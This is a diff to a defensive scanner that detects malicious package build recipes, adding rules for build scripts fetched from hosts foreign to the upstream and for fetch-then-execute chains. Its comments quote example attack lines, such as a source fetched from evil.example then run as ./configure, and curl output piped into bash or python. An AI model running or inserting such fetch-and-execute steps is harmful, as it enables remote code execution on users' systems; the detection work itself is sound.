@@ -30,6 +30,7 @@ from ..config import (
     NETWORK_CLIENT as _NETWORK_CLIENT,
     PAYLOAD_PRODUCER as _PAYLOAD_PRODUCER,
     SCRIPT_EXECUTOR as _SCRIPT_EXECUTOR,
+    _SUBCOMMAND_OPTS as _SUBCOMMAND_OPTS,
 )
 from ..coverage import note_stage_failure
 from ..diffdoc import parse_diff_lines
@@ -803,6 +804,141 @@ def _declared_source_basenames(
     )
 
 
+def _foreign_declared_source_bases(
+    diff_text: str, current_text: str | None = None
+) -> frozenset[str]:
+    """Basenames of declared sources fetched from a host foreign to the
+    package's own upstream.
+
+    Bypass c8c3e1b7: ``source+=("http://evil.example/configure")`` followed
+    by ``./configure`` scored only SOURCE_BUCKET (20), because H083's
+    ``_H072_BENIGN_EXEC`` exemption treated the execution of a file fetched
+    from an attacker host like an ordinary build step.  A benign build
+    script genuinely comes *from the upstream*; one whose declared host
+    matches neither the ``url=`` upstream nor a trusted bucket is a remote
+    payload wearing a build-system name.
+
+    Sharing a host with a sibling declared source does *not* excuse it.  An
+    earlier spelling treated any host that served a second declared source
+    as a legitimate channel, and the wave-4/6 evasion matrix defeated it by
+    declaring two build scripts on the same attacker host - the "sibling"
+    was as foreign as the file it vouched for.  A real distribution channel
+    is the upstream host or a trusted bucket, both checked directly.
+
+    A name qualifies only when there is a reference to diverge from (a
+    ``url=`` host or another declared source), so a lone-source recipe is
+    not flagged by this arm, and hosts in a trusted bucket (official
+    mirrors, forges) are never "foreign".
+    """
+    from ..buckets import classify_url
+    from ..recipedoc import parse_recipe
+    from .structural import (
+        _TRUSTED_SOURCE_BUCKETS,
+        _declared_upstream_url,
+        _forge_owner_repo,
+        _registered_domain,
+    )
+
+    if current_text is not None:
+        post = parse_recipe(current_text)
+        upstream_text = current_text
+    else:
+        doc = parse_diff_lines(split_lines(diff_text))
+        post = parse_recipe("\n".join(doc.post_lines()))
+        upstream_text = "\n".join(doc.post_lines())
+    name_url = _source_urls_by_local_name(post)
+    if not name_url:
+        return frozenset()
+    domains = {
+        name: _registered_domain(_URL_HOST_RE.match(url).group(1))
+        for name, (url, _span) in name_url.items()
+        if _URL_HOST_RE.match(url)
+    }
+    upstream_host = _declared_upstream_url(upstream_text)
+    upstream_m = _URL_HOST_RE.match(upstream_host) if upstream_host else None
+    upstream_dom = _registered_domain(upstream_m.group(1)) if upstream_m else ""
+    #: ``(forge, owner, repo)`` of the upstream, so a source on the *same
+    #: registered domain but a different repository* (``github.com/evil``
+    #: against ``github.com/example/proj``) is not mistaken for the
+    #: upstream.  Registered-domain equality alone was the hole.
+    upstream_repo = _forge_owner_repo(upstream_host) if upstream_host else None
+    #: The hosts and repositories of the declared *archives* - the actual
+    #: artifacts a project distributes.  A benign build script belongs next
+    #: to them; declaring ``configure`` on one host while the tarball sits on
+    #: another is the wave-4 same-host evasion, where the attacker also sets
+    #: ``url=`` to the script's host so a bare ``url=`` comparison is fooled.
+    #: Only archive-shaped names count, so an attacker cannot vouch for a
+    #: script by adding a junk sibling (``.../a``) on the same host.
+    archive_repos = {
+        repo
+        for name, (url, _span) in name_url.items()
+        if _is_archive_url(url) and (repo := _forge_owner_repo(url))
+    }
+    archive_doms = {
+        domains[name]
+        for name, (url, _span) in name_url.items()
+        if name in domains and _is_archive_url(url)
+    } | {repo[0] for repo in archive_repos}
+
+    def _is_upstream_owned(url: str, dom: str) -> bool:
+        """The source lives under the package's own upstream repository."""
+        if not upstream_dom or dom != upstream_dom:
+            return False
+        if upstream_repo is None:
+            return True  # same registered domain, no repo shape to compare
+        src = _forge_owner_repo(url)
+        if src is None:
+            return True  # same domain, non-forge path: the upstream's own
+        return src[1] == upstream_repo[1]  # forge and owner must agree
+
+    def _shares_archive_channel(url: str, dom: str) -> bool:
+        """The source sits alongside the project's declared archive(s)."""
+        if not archive_doms:
+            return True  # no archive to compare against
+        if dom not in archive_doms:
+            return False
+        src = _forge_owner_repo(url)
+        if src is None or not archive_repos:
+            return True
+        return any(repo[1:] == src[1:] for repo in archive_repos)
+
+    foreign: set[str] = set()
+    for name, (url, _span) in name_url.items():
+        dom = domains.get(name, "")
+        if not dom:
+            continue
+        if _is_upstream_owned(url, dom) and _shares_archive_channel(url, dom):
+            continue
+        if not upstream_dom:
+            # No reference host to diverge from: a lone declared host is the
+            # channel, and a trusted mirror is accepted as one.  A benign
+            # build script from an arbitrary host still qualifies below.
+            if len(domains) == 1:
+                continue
+            if classify_url(url)[0] in _TRUSTED_SOURCE_BUCKETS:
+                continue
+        foreign.add(name)
+    return frozenset(foreign)
+
+
+_ARCHIVE_BASENAME_RE = re.compile(
+    r"\.(?:tar(?:\.(?:gz|bz2|xz|zst|lz|Z))?|tgz|tbz2?|txz|tzst|zip|7z|rar|"
+    r"gz|xz|bz2|zst|deb|rpm|jar|whl|AppImage|run)$",
+    re.IGNORECASE,
+)
+
+
+def _is_archive_url(url: str) -> bool:
+    """A declared source that is a distributable artifact, not a script.
+
+    The suffix test plus the VCS schemes; ``foo.patch`` and ``configure`` are
+    deliberately excluded so a sibling script cannot define the channel.
+    """
+    return bool(_ARCHIVE_BASENAME_RE.search(_source_basename(url))) or bool(
+        re.match(r"(?:git|hg|svn|bzr|fossil)\+", url)
+    )
+
+
 @lru_cache(maxsize=8)
 def _declared_source_basenames_cached(text: str, whole_file: bool) -> frozenset[str]:
     from ..differ import _SOURCE_ARRAY_START_RE
@@ -1363,13 +1499,14 @@ _FETCH_OUTPUT_RE = re.compile(
     # Object stores name source and destination positionally, like scp.
     # `moveto`/`move`/`bisync`/`copyurl` were the verbs the harness proved
     # missing: each still lands bytes on the machine.
-    r"|\b(?:s3cmd\s+(?:get|cp|sync)|aws\s+s3\s+(?:cp|sync|mv)"
-    r"|gsutil\s+(?:cp|rsync)"
-    r"|rclone\s+(?:copy|copyto|sync|moveto|move|bisync|copyurl))\b"
+    r"|\b(?:s3cmd" + _SUBCOMMAND_OPTS + r"\s+(?:get|cp|sync)"
+    r"|aws\s+s3" + _SUBCOMMAND_OPTS + r"\s+(?:cp|sync|mv)"
+    r"|gsutil" + _SUBCOMMAND_OPTS + r"\s+(?:cp|rsync)"
+    r"|rclone" + _SUBCOMMAND_OPTS + r"\s+(?:copy|copyto|sync|moveto|move|bisync|copyurl))\b"
     r"(?:\s+-\S+)*\s+(?P<store_src>\S+)\s+"
     r"(?P<store_dest>(?:\"[^\"]*\"|'[^']*'|[^\s;&|<>])+)\s*$"
     # `ipfs get CID` writes a directory named for the CID.
-    r"|\bipfs\s+get\b(?:\s+-\S+)*\s+"
+    r"|\bipfs" + _SUBCOMMAND_OPTS + r"\s+get\b(?:\s+-\S+)*\s+"
     r"(?P<ipfs_cid>[A-Za-z0-9]+)\s*$",
     re.IGNORECASE | re.MULTILINE,
 )
@@ -1574,6 +1711,15 @@ def _fetch_then_execute_findings(diff_text, config, add, current_text=None) -> N
     excluded here - they have their own rule (H083) so checksum-bearing
     source files are not double-counted.
 
+    Fetches are collected from added *and* context lines, but a chain only
+    fires when at least one of its two halves is new in this diff
+    (bypass dbf38ba3: ``curl -o s.sh`` sitting unchanged on a context line
+    with ``bash s.sh`` added, or the mirror image, scored nothing because
+    the pairing pass never saw the unchanged half).  A fetch and its exec
+    both pre-existing on context lines is ordinary build code; the pairing
+    also never attributes an added fetch to a *removed* line, so removed
+    lines are skipped entirely.
+
     The second half of the pass is the *unattributed* arm: a client whose
     output grammar names no file (``sftp``, ``ftp``, ``ssh``, ``git fetch``,
     ``ipfs get``, a glued or server-decided flag) still brings bytes onto
@@ -1593,8 +1739,17 @@ def _fetch_then_execute_findings(diff_text, config, add, current_text=None) -> N
     declared_urls = _declared_source_urls(diff_text)
     heredoc_body = _heredoc_body_indices(lines)
 
-    fetched_by_fn: dict[str, list[str]] = {}
-    cloned_by_fn: dict[str, list[str]] = {}
+    #: Fetched paths pair with executions across the diff boundary, so each
+    #: entry carries whether the fetch line itself was added: a chain fires
+    #: only when the fetch or the execution (or both) is new - two context
+    #: halves are pre-existing code, not a chain this diff created.  Fetches
+    #: are collected in a pre-pass over every non-removed line so that an
+    #: execution added *above* a pre-existing fetch still pairs with it
+    #: (bypass dbf38ba3); within one function the pairing is by name, not by
+    #: line order, because either order lands bytes on disk that the other
+    #: line then runs.
+    fetched_by_fn: dict[str, list[tuple[str, bool]]] = {}
+    cloned_by_fn: dict[str, list[tuple[str, bool]]] = {}
     #: (phase rank, line index, client, fetch scope) for fetches whose
     #: destination the grammar cannot name.  A scheme-bearing URL is left
     #: to H016/H082's attributed arm, so one command is not scored twice -
@@ -1603,8 +1758,34 @@ def _fetch_then_execute_findings(diff_text, config, add, current_text=None) -> N
     pending_fetch: list[tuple[int, int, str, str]] = []
 
     for i, line in enumerate(lines):
+        if line.startswith("-"):
+            continue
         fn = scopes.within(i, _FETCH_SCOPE_FUNCTIONS)
-        if not line.startswith("+") or fn is None:
+        if fn is None or i in heredoc_body:
+            continue
+        if len(line) > MAX_RULE_LINE_BYTES:
+            continue
+        body = _strip_comment(line[1:])
+        outputs = _collect_fetch_outputs(body, declared_urls)
+        for path in outputs:
+            fetched_by_fn.setdefault(fn, []).append(
+                (path, line.startswith("+")))
+        for directory in _clone_destinations(body):
+            cloned_by_fn.setdefault(fn, []).append(
+                (directory, line.startswith("+")))
+        client = _FETCH_CLIENT_RE.search(body)
+        if (client and (not outputs or "://" not in body)
+                and not claims_pipe_to_shell(body)
+                and not claims_upload_line(body, config)):
+            pending_fetch.append(
+                (_PHASE_RANK.get(fn, 9), i, client.group(0)[:40], fn))
+
+    for i, line in enumerate(lines):
+        if line.startswith("-"):
+            continue
+        added = line.startswith("+")
+        fn = scopes.within(i, _FETCH_SCOPE_FUNCTIONS)
+        if fn is None:
             continue
         if i in heredoc_body:
             continue
@@ -1614,52 +1795,38 @@ def _fetch_then_execute_findings(diff_text, config, add, current_text=None) -> N
             continue
         body = _strip_comment(line[1:])
 
-        outputs = _collect_fetch_outputs(body, declared_urls)
-        for path in outputs:
-            fetched_by_fn.setdefault(fn, []).append(path)
-        # A clone fills a whole directory, so the pairing is by prefix
-        # rather than by name: anything under it came from the remote.
-        for directory in _clone_destinations(body):
-            cloned_by_fn.setdefault(fn, []).append(directory)
         # A rename of a fetched artifact is the same payload under a new
         # name: a transform that reads a path under a clone directory (or a
         # fetched output) and writes a new file makes that file pairable.
         for _kind, wpath in _collect_writes(body, fn):
             if not wpath:
                 continue
-            if (_body_references(body, fetched_by_fn.get(fn, ()))
-                    or _body_under_dir(body, cloned_by_fn.get(fn, ()))):
-                fetched_by_fn.setdefault(fn, []).append(wpath)
-
-        client = _FETCH_CLIENT_RE.search(body)
-        # Pending when the grammar named no output, or when the line carries
-        # no scheme address for the attributed arm to read.  A line whose
-        # only scheme URL is a declared source produces no output here, so
-        # the decoy cannot silence it.
-        if (client and (not outputs or "://" not in body)
-                and not claims_pipe_to_shell(body)
-                and not claims_upload_line(body, config)):
-            pending_fetch.append(
-                (_PHASE_RANK.get(fn, 9), i, client.group(0)[:40], fn))
+            if (_body_references(body, [p for p, _a in fetched_by_fn.get(fn, ())])
+                    or _body_under_dir(body, [d for d, _a in cloned_by_fn.get(fn, ())])):
+                fetched_by_fn.setdefault(fn, []).append((wpath, added))
 
         # An interpreter reading a fetch's stdout through a process
         # substitution is the chain on one line: `python3 < <(curl URL)`.
         # The stdin redirect guard in `_EXECUTION_RE` keeps `<(` out, so
-        # this is its own read of the same evidence.
-        for subst in _PROC_SUBST_STDIN_RE.finditer(body):
-            if _FETCH_CLIENT_RE.search(subst.group(1)):
-                add("H082", "Fetch Then Execute", "CRITICAL", "network_execution",
-                    f"{fn}() executes the output of a fetch through a "
-                    "process substitution",
-                    line=_find_line(diff_text, "python" if "python" in body
-                                    else body.strip()[:40]),
-                    position=fn, path="<process-substitution>")
-                return
+        # this is its own read of the same evidence.  Only an added line
+        # can fire: the chain must be new in this diff.
+        if added:
+            for subst in _PROC_SUBST_STDIN_RE.finditer(body):
+                if _FETCH_CLIENT_RE.search(subst.group(1)):
+                    add("H082", "Fetch Then Execute", "CRITICAL", "network_execution",
+                        f"{fn}() executes the output of a fetch through a "
+                        "process substitution",
+                        line=_find_line(diff_text, "python" if "python" in body
+                                        else body.strip()[:40]),
+                        position=fn, path="<process-substitution>")
+                    return
 
         for path in _collect_executions(body):
             base = os.path.basename(path)
-            for directory in cloned_by_fn.get(fn, []):
+            for directory, fetch_added in cloned_by_fn.get(fn, []):
                 if directory and path.startswith(directory.rstrip("/") + "/"):
+                    if not (added or fetch_added):
+                        continue
                     add("H082", "Fetch Then Execute", "CRITICAL",
                         "network_execution",
                         f"{fn}() clones into {directory} and then executes "
@@ -1667,10 +1834,12 @@ def _fetch_then_execute_findings(diff_text, config, add, current_text=None) -> N
                         line=_find_line(diff_text, path or base),
                         position=fn, path=path)
                     return
-            for fpath in list(fetched_by_fn.get(fn, [])):
+            for fpath, fetch_added in list(fetched_by_fn.get(fn, [])):
                 fbase = os.path.basename(fpath)
                 if fpath != path and fbase != base:
                     continue
+                if not (added or fetch_added):
+                    continue  # both halves pre-existing: not this diff's chain
                 # The benign-artifact exemption claims "this file came with
                 # the project".  A `Makefile` this recipe just downloaded
                 # did not, and `curl -o Makefile URL` followed by `make`
@@ -1692,6 +1861,9 @@ def _fetch_then_execute_findings(diff_text, config, add, current_text=None) -> N
                 continue
             rank = _PHASE_RANK.get(fn, 9)
             for fetch_rank, fetch_index, fetch_client, fetch_fn in pending_fetch:
+                fetch_added = lines[fetch_index].startswith("+")
+                if not (added or fetch_added):
+                    continue  # both halves pre-existing: not this diff's chain
                 if fetch_index > i or fetch_rank > rank:
                     continue
                 # A fetch and an execution on the same line pair only when
@@ -1775,11 +1947,15 @@ def _source_file_execution_findings(diff_text, config, add, current_text=None) -
 
     Build-system scripts (configure, make, meson, ninja, cmake) are common
     declared-source executables and stay silent; the rule targets interpreted
-    execution of a downloaded script.
+    execution of a downloaded script.  The exemption does not extend to a
+    declared source whose host is foreign to the upstream (bypass c8c3e1b7):
+    executing ``./configure`` fetched from an attacker-controlled host is
+    not an ordinary build step.
     """
     lines = resolve_added_lines(diff_text)
     scopes = ScopeResolver(lines, _recipe_lines(current_text))
     source_basenames = _declared_source_basenames(diff_text, current_text)
+    foreign_bases = _foreign_declared_source_bases(diff_text, current_text)
     heredoc_body = _heredoc_body_indices(lines)
     #: fn -> {renamed basename: declared source basename}.  A transform that
     #: reads a declared file and writes a new name (`awk '1' "$srcdir/x" >
@@ -1822,7 +1998,13 @@ def _source_file_execution_findings(diff_text, config, add, current_text=None) -
                 continue
             path = _norm_path(raw)
             base = os.path.basename(path)
-            if not base or base in _H072_BENIGN_EXEC:
+            if not base:
+                continue
+            # A benign build-system name only excuses execution when the
+            # file plausibly came with the project; a declared source from
+            # a host foreign to the upstream is a payload wearing a build
+            # name and keeps the full H083 treatment.
+            if base in _H072_BENIGN_EXEC and base not in foreign_bases:
                 continue
             # A patch application is not an execution of the patch file.
             if patch_base and base == patch_base:
